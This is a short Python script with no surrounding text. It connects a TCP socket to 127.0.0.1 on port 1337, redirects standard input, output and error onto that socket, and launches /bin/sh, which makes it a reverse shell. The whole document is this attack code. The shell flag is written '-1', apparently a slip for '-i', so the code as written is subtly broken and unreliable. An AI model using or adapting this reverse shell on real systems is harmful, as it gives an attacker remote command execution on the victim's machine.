                         
import os
import subprocess
import socket

target = ("127.0.0.1",1337)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(target)

os.dup2(sock.fileno(), 0)
os.dup2(sock.fileno(), 1)
os.dup2(sock.fileno(), 2)

subprocess.call(["/bin/sh", "-1"])
